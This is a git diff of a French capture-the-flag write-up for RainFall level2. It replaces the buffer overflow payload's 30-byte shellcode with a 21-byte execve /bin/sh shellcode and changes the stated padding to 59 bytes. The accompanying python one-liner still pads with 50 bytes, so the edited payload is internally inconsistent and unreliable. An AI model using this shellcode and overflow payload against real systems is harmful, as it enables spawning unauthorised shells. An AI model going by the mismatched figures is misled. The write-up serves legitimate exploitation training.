@@ -118,18 +118,18 @@ Nous utiliserons le shellcode suivant de 30 octets :
 
 ## Construction du payload
 
-Notre shellcode fait 30 octets de long. Nous devons remplir avec des données arbitraires jusqu'à 80 octets, puis les 4 derniers octets pour l'adresse de retour.
+Notre shellcode fait 21 octets de long. Nous devons remplir avec des données arbitraires jusqu'à 80 octets, puis les 4 derniers octets pour l'adresse de retour.
 
 ### Payload final
 
 Le buffer d'attaque final sera structuré comme suit :
 
-- Shellcode : 30 octets
-- Remplissage de données arbitraires : 50 octets
+- Shellcode : 21 octets
+- Remplissage de données arbitraires : 59 octets
 - Adresse de retour : 4 octets
 
 ```bash
-level2@RainFall:~$ python -c 'print "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "A" * 50 + "\x08\xa0\x04\x08"' > /tmp/exploit
+level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 50 + "\x08\xa0\x04\x08"' > /tmp/exploit
 ```
 
 ### Exécution de l'exploit
